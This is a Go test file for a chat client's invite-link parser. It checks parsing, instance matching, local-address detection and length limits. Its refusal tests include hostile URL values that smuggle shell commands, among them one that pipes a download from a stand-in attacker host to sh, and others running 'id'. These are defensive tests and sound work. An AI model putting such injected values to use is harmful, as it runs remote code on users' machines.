// SPDX-FileCopyrightText: 2026 Alexandre Duffez
// SPDX-License-Identifier: AGPL-3.0-or-later

package ops_test

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Alexnex31/Norite/cli/internal/ops"
)

func TestALinkReadsBackAsTheInstanceAndTheCode(t *testing.T) {
	for _, instance := range []string{"https://chat.example.com", "http://192.168.1.20:8080", "https://example.com/norite"} {
		link := ops.InviteLink(instance, "PGTQRBXGTCDFFWBH")
		got, err := ops.ParseInvite(link)
		require.NoError(t, err, link)
		assert.Equal(t, ops.Invite{Instance: instance, Code: "PGTQRBXGTCDFFWBH"}, got, link)
	}
	assert.Equal(t, "https://chat.example.com/join#PGTQRBXGTCDFFWBH",
		ops.InviteLink("https://chat.example.com/", "PGTQRBXGTCDFFWBH"))
}

func TestAnInviteIsALinkOrACode(t *testing.T) {
	for raw, want := range map[string]ops.Invite{
		"PGTQRBXGTCDFFWBH":       {Code: "PGTQRBXGTCDFFWBH"},
		"  pgtq-rbxg-tcdf-fwbh ": {Code: "pgtq-rbxg-tcdf-fwbh"},
		"PGTQ RBXG TCDF FWBH":    {Code: "PGTQ RBXG TCDF FWBH"},
		"PGTQ\tRBXG":             {Code: "PGTQ\tRBXG"},
		// As an instance URL is read: a bare host is https.
		"chat.example.com/join#PGTQRBXGTCDFFWBH":   {Instance: "https://chat.example.com", Code: "PGTQRBXGTCDFFWBH"},
		"https://chat.example.com/join/#ABCD-EFGH": {Instance: "https://chat.example.com", Code: "ABCD-EFGH"},
		"HTTPS://Chat.Example.com/join#ABCD":       {Instance: "https://Chat.Example.com", Code: "ABCD"},
		// What an address is written with: a port, an IPv6 literal, a path, a name in another script.
		"http://[fd00::1]:8080/n-o_r.i~te/join#ABCD": {Instance: "http://[fd00::1]:8080/n-o_r.i~te", Code: "ABCD"},
		"https://café.example/join#ABCD":             {Instance: "https://café.example", Code: "ABCD"},
	} {
		got, err := ops.ParseInvite(raw)
		require.NoError(t, err, raw)
		assert.Equal(t, want, got, raw)
	}
}

// Anything a link does not need is refused, not ignored: the link decides where a password goes.
func TestWhatIsNotAnInviteIsRefused(t *testing.T) {
	for _, raw := range []string{
		"",
		"   ",
		"https://chat.example.com/join",  // no code
		"https://chat.example.com/join#", // no code
		"https://chat.example.com/#PGTQRBXGTCDFFWBH",           // not /join
		"https://chat.example.com/joint#PGTQRBXGTCDFFWBH",      // not /join
		"https://chat.example.com/join?x=1#PGTQRBXGTCDFFWBH",   // a query
		"https://chat.example.com/join?#PGTQRBXGTCDFFWBH",      // an empty one
		"https://chat.example.com/a/../join#PGTQRBXGTCDFFWBH",  // a dot segment
		"https://chat.example.com/./join#PGTQRBXGTCDFFWBH",     // a dot segment
		"https://chat.example.com/join#PGTQ/RBXG",              // not a code
		"https://chat.example.com/join#PGTQ\u202eRBXG",         // not a code, and a bidi override
		"https://evil.example#x/join#PGTQRBXGTCDFFWBH",         // the fragment is everything after the first #
		"https://chat.example.com/a%3Fx/join#PGTQRBXGTCDFFWBH", // a query hidden in the path
		"https://chat.example.com/a%23x/join#PGTQRBXGTCDFFWBH", // a fragment hidden in the path
		"https://chat.example.com/a%2Fb/join#PGTQRBXGTCDFFWBH", // any encoding at all
		"https://chat.example.com/it's/join#PGTQRBXGTCDFFWBH",  // a quote, which could not be printed back quoted
		// What a shell reads, in an address printed back unquoted as part of a command to paste.
		"https://chat.example.com/$(curl -s evil.example|sh)/join#PGTQRBXGTCDFFWBH",
		"https://a$(id).example/join#PGTQRBXGTCDFFWBH",
		"https://a;id;.example/join#PGTQRBXGTCDFFWBH",
		"https://chat.example.com/`id`/join#PGTQRBXGTCDFFWBH",
		"https://chat.example.com/a&b/join#PGTQRBXGTCDFFWBH",
		"https://chat.example.com/a b/join#PGTQRBXGTCDFFWBH",
		`https://chat.example.com/a"b/join#PGTQRBXGTCDFFWBH`,
		`https://chat.example.com/a\b/join#PGTQRBXGTCDFFWBH`,
		"PGTQ_RBXG",
		"PGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHX", // past the bound
	} {
		_, err := ops.ParseInvite(raw)
		assert.Error(t, err, "%q", raw)
	}
}

func TestALinkNamingAnUnusableInstanceIsRefused(t *testing.T) {
	for _, raw := range []string{
		"ftp://chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https:///join#PGTQRBXGTCDFFWBH",
		"https://user:pass@chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https://user@chat.example.com/join#PGTQRBXGTCDFFWBH",
		"https://chat\u00a0example.com/join#PGTQRBXGTCDFFWBH",
	} {
		_, err := ops.ParseInvite(raw)
		assert.Error(t, err, "%q", raw)
	}
}

func TestALinkForAnotherInstanceIsRefusedNamingBoth(t *testing.T) {
	inv, err := ops.ParseInvite("https://other.example/join#PGTQRBXGTCDFFWBH")
	require.NoError(t, err)
	err = inv.For("https://chat.example.com")
	require.Error(t, err)
	assert.Equal(t, "that invite is for https://other.example, and this machine is signed in to "+
		"https://chat.example.com", err.Error())

	same, err := ops.ParseInvite("https://Chat.Example.com/join#PGTQRBXGTCDFFWBH")
	require.NoError(t, err)
	assert.NoError(t, same.For("https://chat.example.com/"))
	// A bare code names no instance, and is taken to be for the one signed in to.
	assert.NoError(t, ops.Invite{Code: "PGTQRBXGTCDFFWBH"}.For("https://chat.example.com"))
}

func TestALinkToThisMachineAloneIsToldApart(t *testing.T) {
	for _, local := range []string{
		"http://localhost:8080", "http://LOCALHOST", "http://norite.localhost", "http://127.0.0.1:8080",
		"http://127.1.2.3", "http://[::1]:8080", "http://[::ffff:127.0.0.1]", "http://169.254.10.1",
		"http://[fe80::1]", "http://0.0.0.0:8080", "http://[::]:8080",
	} {
		assert.True(t, ops.LocalOnly(local), local)
	}
	for _, shared := range []string{
		"https://chat.example.com", "http://192.168.1.20:8080", "http://10.0.2.2:8130", "http://[2001:db8::1]",
		"http://localhost.example.com",
	} {
		assert.False(t, ops.LocalOnly(shared), shared)
	}
}

func TestACodeIsSentOnlyToTheInstanceItsLinkNames(t *testing.T) {
	code, err := ops.CodeFor("https://chat.example.com/join#PGTQRBXGTCDFFWBH", "https://chat.example.com")
	require.NoError(t, err)
	assert.Equal(t, "PGTQRBXGTCDFFWBH", code)

	code, err = ops.CodeFor(" PGTQ-RBXG ", "")
	require.NoError(t, err, "a bare code names no instance, so there is nothing to check")
	assert.Equal(t, "PGTQ-RBXG", code)

	_, err = ops.CodeFor("https://other.example/join#PGTQRBXGTCDFFWBH", "https://chat.example.com")
	assert.EqualError(t, err, "that invite is for https://other.example, and this machine is signed in to "+
		"https://chat.example.com")

	// Not yet known is not the same instance: the code would go wherever the daemon then reaches.
	_, err = ops.CodeFor("https://chat.example.com/join#PGTQRBXGTCDFFWBH", "")
	assert.EqualError(t, err, "the daemon has not said which instance it is signed in to yet, so that link "+
		"cannot be checked against it; try again in a moment")
}

func TestAnInvitePastItsBoundIsRefused(t *testing.T) {
	link := "https://chat.example.com/" + strings.Repeat("a/", 250) + "join#PGTQRBXGTCDFFWBH"
	require.Greater(t, len(link), ops.MaxInvite)
	_, err := ops.ParseInvite(link)
	assert.Error(t, err)
	under := "https://chat.example.com/" + strings.Repeat("a/", 100) + "join#PGTQRBXGTCDFFWBH"
	require.LessOrEqual(t, len(under), ops.MaxInvite)
	_, err = ops.ParseInvite(under)
	assert.NoError(t, err)
}
